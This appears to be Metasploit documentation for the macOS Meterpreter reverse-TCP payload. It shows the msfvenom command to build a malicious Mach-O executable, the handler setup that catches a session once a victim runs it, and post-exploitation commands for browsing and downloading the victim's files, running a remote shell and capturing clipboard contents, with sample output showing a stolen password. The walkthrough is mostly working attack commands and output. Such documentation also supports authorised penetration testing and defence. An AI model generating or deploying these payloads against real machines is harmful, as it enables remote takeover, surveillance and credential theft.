osx/x64/meterpreter_reverse_tcp is similar to the linux meterpreter, but built for OSX.
It allows you to remotely take over the compromised system, having control of the file system,
webcam, microphone, screenshot and collect sensitive information such as credentials
using post modules, etc.

## Vulnerable Application

osx/x64/meterpreter_reverse_tcp 64-bit MacOSX platforms from 10.8 onwards.

## Deploying osx/x64/meterpreter_reverse_tcp

To use osx/x64/meterpreter_reverse_tcp as an executable, first you can generate it with msfvenom:

```
./msfvenom -p osx/x64/meterpreter_reverse_tcp LHOST=[IP] LPORT=4444 -f macho -o /tmp/payload.bin
```

Before sending the executable to the victim machine, you need to set up the handler on your end:

1. Start msfconsole
2. Do: ```use exploit/multi/handler```
3. Do: ```set PAYLOAD osx/x64/meterpreter_reverse_tcp```
4. Do: ```set LHOST [Your IP]```
5. Do: ```run```

And that should start the listener. When the victim runs the malicious executable, you should
receive a session:

```
msf exploit(handler) > run
[*] Exploit running as background job.

[*] Started reverse TCP handler on 172.16.23.1:4444 
msf exploit(handler) > [*] Meterpreter session 1 opened (172.16.23.1:4444 -> 172.16.23.182:45009) at 2017-08-08 12:34:49 +0800

msf exploit(handler) > sessions 1
[*] Starting interaction with 1...

meterpreter >
```


## Important Basic Commands

Here is a list of some of the common commands you might need while using Meterpreter:

**pwd**

The ```pwd``` command tells you the current working directory. For example:

```
meterpreter > pwd
/Users/User/Desktop
```

**cd**

The ```cd``` command allows you to change directories. Example:

```
meterpreter > cd /tmp
```

**cat**

The ```cat``` command allows you to see the content of a file:

```
meterpreter > cat /tmp/data.txt
hello world
```

**upload**

The ```upload``` command allows you to upload a file to the remote target. For example:

```
meterpreter > upload /tmp/data.bin /Users/User/Desktop
[*] uploading  : /tmp/data.bin -> /Users/User/Desktop
[*] uploaded   : /tmp/data.bin -> /Users/User/Desktop/data.bin
meterpreter > 
```

**download**

The ```download``` command allows you to download a file from the remote target to your machine. For example:

```
meterpreter > download /Users/User/Desktop/data.bin /tmp
[*] downloading: /Users/User/Desktop/data.bin -> /tmp/data.bin
[*] download   : /Users/User/Desktop/data.bin -> /tmp/data.bin
```

**ifconfig/ipconfig**

```ifconfig``` and ```ipconfig``` are actually the same thing. They allow you to see the network
interfaces on the remote machine.

**getuid**

The ```getuid``` command tells you the current user that Meterpreter is running on. For example:

```
meterpreter > getuid
Server username: uid=502, gid=20, euid=502, egid=20
```

**execute**

The ```execute``` command allows you to execute a command or file on the remote machine.
For example:

```
meterpreter > execute -f echo -a "hello > /tmp/hello.txt"
Process 5292 created.
```

**ps**

The ```ps``` command lists the running processes on the remote machine.

**shell**

The ```shell``` command allows you to interact with the remote machine's terminal (or shell). For
example:

```
meterpreter > shell
Process 29335 created.
Channel 2 created.
cat /tmp/hello.txt
hello
exit
meterpreter >
```

If you wish to get back to Meterpreter, do [CTRL]+[Z] to background the channel or
[CTRL]+[Z] then y (or the exit command) to terminate the channel.

**sysinfo**

The ```sysinfo``` command shows you basic information about the remote machine. Such as:

* Computer name
* OS name
* Architecture
* Meterpreter type

For example:

```
meterpreter > sysinfo
Computer     : My-Computer.local
OS           : Mac OS X Sierra (MacOSX 10.12.6)
Architecture : x86
Meterpreter  : x64/osx
meterpreter > 
```

**Extensions**

OSX Meterpreter supports reading and writing to the clipboard with the extapi extension, 
you can load it with the ```load``` command:

```
meterpreter > load extapi
Loading extension extapi...Success.
meterpreter > clipboard_get_data
Text captured at
=================
pa$$w0rd
=================
```

**Other commands**

For a complete list of OSX Meterpreter commands, do the following at the prompt:

```
meterpreter > help
```


